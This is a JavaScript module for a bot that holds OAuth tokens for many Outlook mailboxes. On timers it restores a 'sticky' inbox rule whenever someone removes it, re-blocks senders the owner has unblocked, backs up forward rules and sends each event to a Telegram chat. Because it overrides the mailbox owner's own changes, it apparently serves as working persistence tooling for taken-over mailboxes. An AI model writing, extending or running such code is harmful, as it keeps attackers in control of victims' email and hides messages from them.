// src/outlook/monitor.js
const cron = require('node-cron');
const Account = require('../models/Account');
const Log = require('../models/Log');
const Backup = require('../models/Backup');
const OutlookAuth = require('./auth');
const RuleManager = require('./rules');
const BlockedSendersManager = require('./blocked');
const { encryptToken, decryptToken } = require('../utils/encryption');

class OutlookMonitor {
    constructor(bot) {
        this.bot = bot;
        this.outlookAuth = new OutlookAuth();
        this.ruleManager = new RuleManager();
        this.blockedManager = new BlockedSendersManager();
        this.isRunning = false;
    }

    start() {
        if (this.isRunning) {
            console.log('⚠️ Monitor already running');
            return;
        }

        console.log('🚀 Starting 24/7 Outlook Monitor...');
        this.isRunning = true;

        // 🔴 STICKY RULE CHECK - EVERY 5 MINUTES
        cron.schedule('*/5 * * * *', async () => {
            console.log('🔄 [Rule Monitor] Checking sticky rules...');
            await this.checkAllStickyRules();
        });

        // 🔴 BLOCKED SENDERS CHECK - EVERY 10 MINUTES
        cron.schedule('*/10 * * * *', async () => {
            console.log('🔄 [Blocked Senders] Monitoring for unblocks...');
            await this.monitorAllBlockedSenders();
        });

        // 🔴 TOKEN REFRESH - EVERY 30 MINUTES
        cron.schedule('*/30 * * * *', async () => {
            console.log('🔄 [Token Refresh] Refreshing expiring tokens...');
            await this.refreshAllTokens();
        });

        // 🔴 AUTO BACKUP - EVERY 24 HOURS
        cron.schedule('0 2 * * *', async () => {
            console.log('💾 [Auto Backup] Creating daily backups...');
            await this.createAutoBackups();
        });

        // 🔴 DAILY STATS RESET - MIDNIGHT
        cron.schedule('0 0 * * *', async () => {
            console.log('📊 [Daily Reset] Resetting daily stats...');
            global.botStats.rulesToday = 0;
            global.botStats.rulesRestored = 0;
            global.botStats.blocksToday = 0;
        });

        // 🔴 DAILY REPORT - 9:00 AM
        cron.schedule('0 9 * * *', async () => {
            console.log('📈 [Daily Report] Sending daily summary...');
            await this.sendDailyReports();
        });

        console.log('✅ Monitor started successfully - 24/7 active');
    }

    async checkAllStickyRules() {
        try {
            const accounts = await Account.find({ status: 'active' });
            global.botStats.totalAccounts = accounts.length;
            
            console.log(`📧 Checking sticky rules for ${accounts.length} accounts...`);

            let restored = 0;
            let failed = 0;

            for (const account of accounts) {
                try {
                    const refreshToken = decryptToken(account.refreshToken);
                    const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
                    
                    if (!tokenResult.success) {
                        account.status = 'reconnect_needed';
                        await account.save();
                        
                        if (account.telegramChatId) {
                            await this.bot.sendMessage(
                                account.telegramChatId,
                                `⚠️ *Reconnection Required*\n\n` +
                                `Account: \`${account.email}\`\n` +
                                `Reason: Token expired\n` +
                                `Action: Use /reconnect ${account.email}`,
                                { parse_mode: 'Markdown' }
                            );
                        }
                        failed++;
                        continue;
                    }

                    const ruleResult = await this.ruleManager.ensureStickyRule(
                        tokenResult.accessToken,
                        account._id
                    );

                    account.ruleStats.enforceCount = (account.ruleStats.enforceCount || 0) + 1;
                    account.ruleStats.lastEnforced = new Date();
                    account.lastChecked = new Date();
                    account.accessToken = encryptToken(tokenResult.accessToken);
                    account.tokenExpiry = new Date(Date.now() + tokenResult.expiresIn * 1000);
                    
                    await account.save();

                    global.botStats.rulesToday = (global.botStats.rulesToday || 0) + 1;
                    
                    if (ruleResult.status === 'restored' || ruleResult.status === 'created') {
                        restored++;
                        global.botStats.rulesRestored = (global.botStats.rulesRestored || 0) + 1;
                        
                        if (account.telegramChatId) {
                            await this.bot.sendMessage(
                                account.telegramChatId,
                                `🛡️ *Rule Alert - ${account.email}*\n\n` +
                                `Action: Sticky rule was ${ruleResult.status}\n` +
                                `Time: ${new Date().toLocaleTimeString()}`,
                                { parse_mode: 'Markdown' }
                            );
                        }
                    }

                } catch (err) {
                    failed++;
                    console.error(`❌ Rule check failed for ${account.email}:`, err.message);
                    
                    await Log.create({
                        accountId: account._id,
                        action: 'rule_check_failed',
                        status: 'failure',
                        message: err.message,
                        details: { error: err.stack }
                    });
                }
            }

            console.log(`✅ Rule check complete - Restored: ${restored}, Failed: ${failed}`);

        } catch (error) {
            console.error('❌ Rule monitoring error:', error);
        }
    }

    async monitorAllBlockedSenders() {
        try {
            const accounts = await Account.find({ status: 'active' });
            console.log(`🚫 Monitoring blocked senders for ${accounts.length} accounts...`);

            let totalReblocked = 0;

            for (const account of accounts) {
                try {
                    const refreshToken = decryptToken(account.refreshToken);
                    const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
                    
                    if (tokenResult.success) {
                        const currentBlocked = await this.blockedManager.getBlockedSenders(
                            tokenResult.accessToken
                        );

                        const lastState = await Log.findOne({
                            accountId: account._id,
                            action: 'blocked_senders_state'
                        }).sort({ createdAt: -1 });

                        const previousBlocked = lastState?.details?.senders || [];
                        const unblocked = previousBlocked.filter(s => !currentBlocked.includes(s));

                        for (const sender of unblocked) {
                            try {
                                await this.blockedManager.addBlockedSender(
                                    tokenResult.accessToken,
                                    account._id,
                                    sender
                                );
                                totalReblocked++;
                                
                                global.botStats.blocksToday = (global.botStats.blocksToday || 0) + 1;

                                if (account.telegramChatId) {
                                    await this.bot.sendMessage(
                                        account.telegramChatId,
                                        `🚫 *Blocked Sender Alert - ${account.email}*\n\n` +
                                        `Sender: \`${sender}\`\n` +
                                        `Action: Re-blocked (was unblocked)`,
                                        { parse_mode: 'Markdown' }
                                    );
                                }
                            } catch (err) {
                                console.error(`Failed to re-block ${sender}:`, err);
                            }
                        }

                        await Log.create({
                            accountId: account._id,
                            action: 'blocked_senders_state',
                            status: 'info',
                            details: { 
                                senders: currentBlocked,
                                count: currentBlocked.length,
                                timestamp: new Date()
                            }
                        });

                        account.blockedSenders = currentBlocked;
                        await account.save();
                    }
                } catch (err) {
                    console.error(`❌ Blocked senders check failed for ${account.email}:`, err.message);
                }
            }

            if (totalReblocked > 0) {
                console.log(`✅ Re-blocked ${totalReblocked} senders across all accounts`);
            }

        } catch (error) {
            console.error('❌ Blocked senders monitoring error:', error);
        }
    }

    async refreshAllTokens() {
        try {
            const expiryThreshold = new Date(Date.now() + 30 * 60 * 1000);
            const accounts = await Account.find({
                status: 'active',
                tokenExpiry: { $lt: expiryThreshold }
            });

            if (accounts.length === 0) return;

            console.log(`🔄 Refreshing ${accounts.length} expiring tokens...`);

            for (const account of accounts) {
                try {
                    const refreshToken = decryptToken(account.refreshToken);
                    const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
                    
                    if (tokenResult.success) {
                        account.accessToken = encryptToken(tokenResult.accessToken);
                        account.refreshToken = encryptToken(tokenResult.refreshToken);
                        account.tokenExpiry = new Date(Date.now() + tokenResult.expiresIn * 1000);
                        await account.save();

                        console.log(`✅ Token refreshed for ${account.email}`);
                    }
                } catch (err) {
                    console.error(`❌ Token refresh failed for ${account.email}:`, err.message);
                    
                    account.status = 'reconnect_needed';
                    await account.save();

                    if (account.telegramChatId) {
                        await this.bot.sendMessage(
                            account.telegramChatId,
                            `⚠️ *Token Expired - ${account.email}*\n\n` +
                            `Action: Use /reconnect ${account.email}`,
                            { parse_mode: 'Markdown' }
                        );
                    }
                }
            }

        } catch (error) {
            console.error('❌ Token refresh error:', error);
        }
    }

    async createAutoBackups() {
        try {
            const accounts = await Account.find({ 
                status: 'active',
                autoBackup: true 
            });

            console.log(`💾 Creating auto backups for ${accounts.length} accounts...`);

            for (const account of accounts) {
                try {
                    const refreshToken = decryptToken(account.refreshToken);
                    const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
                    
                    if (tokenResult.success) {
                        const rules = await this.ruleManager.getRules(tokenResult.accessToken);
                        const blocked = await this.blockedManager.getBlockedSenders(tokenResult.accessToken);

                        const backupId = `auto_${Date.now()}_${account._id}`;
                        
                        await Backup.create({
                            backupId,
                            accountId: account._id,
                            accountEmail: account.email,
                            snapshot: {
                                rules,
                                blockedSenders: blocked,
                                forwardRules: account.forwardRules || [],
                                timestamp: new Date()
                            },
                            type: 'auto',
                            metadata: { reason: 'daily_auto_backup' }
                        });

                        account.lastBackup = new Date();
                        await account.save();
                    }
                } catch (err) {
                    console.error(`❌ Auto backup failed for ${account.email}:`, err.message);
                }
            }

            console.log('✅ Auto backups completed');

        } catch (error) {
            console.error('❌ Auto backup error:', error);
        }
    }

    async sendDailyReports() {
        try {
            const users = await Account.distinct('telegramChatId');
            
            for (const chatId of users) {
                if (!chatId) continue;

                const userAccounts = await Account.find({ telegramChatId: chatId });
                const activeAccounts = userAccounts.filter(a => a.status === 'active').length;
                
                const yesterday = new Date(Date.now() - 24 * 60 * 60 * 1000);
                
                const rulesRestored = await Log.countDocuments({
                    accountId: { $in: userAccounts.map(a => a._id) },
                    action: { $in: ['rule_restored', 'rule_created'] },
                    createdAt: { $gte: yesterday }
                });
                
                const blocksToday = await Log.countDocuments({
                    accountId: { $in: userAccounts.map(a => a._id) },
                    action: 'sender_blocked',
                    createdAt: { $gte: yesterday }
                });

                const reportMsg = 
                    `📊 *Daily Report - ${new Date().toLocaleDateString()}*\n\n` +
                    `📧 *Accounts:*\n` +
                    `├ Total: ${userAccounts.length}\n` +
                    `├ Active: ${activeAccounts}\n` +
                    `└ Reconnect needed: ${userAccounts.length - activeAccounts}\n\n` +
                    `🛡️ *Sticky Rule:*\n` +
                    `├ Checks: ${global.botStats.rulesToday || 0}\n` +
                    `└ Restored: ${rulesRestored}\n\n` +
                    `🚫 *Blocked Senders:*\n` +
                    `└ New blocks: ${blocksToday}\n\n` +
                    `✅ *System Status:* Operational\n` +
                    `🕐 Report Time: ${new Date().toLocaleTimeString()}`;

                await this.bot.sendMessage(chatId, reportMsg, { parse_mode: 'Markdown' });
            }

            console.log('✅ Daily reports sent');

        } catch (error) {
            console.error('❌ Daily report error:', error);
        }
    }

    async verifyAccount(accountId) {
        try {
            const account = await Account.findById(accountId);
            if (!account) throw new Error('Account not found');

            const refreshToken = decryptToken(account.refreshToken);
            const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
            
            if (!tokenResult.success) {
                account.status = 'reconnect_needed';
                await account.save();
                return { success: false, error: 'Token expired' };
            }

            const ruleResult = await this.ruleManager.ensureStickyRule(
                tokenResult.accessToken,
                account._id
            );

            account.accessToken = encryptToken(tokenResult.accessToken);
            account.tokenExpiry = new Date(Date.now() + tokenResult.expiresIn * 1000);
            account.lastChecked = new Date();
            account.ruleStats.enforceCount = (account.ruleStats.enforceCount || 0) + 1;
            account.ruleStats.lastEnforced = new Date();
            await account.save();

            return { 
                success: true, 
                ruleStatus: ruleResult.status,
                email: account.email 
            };

        } catch (error) {
            console.error('❌ Verify account error:', error);
            return { success: false, error: error.message };
        }
    }
}

module.exports = OutlookMonitor;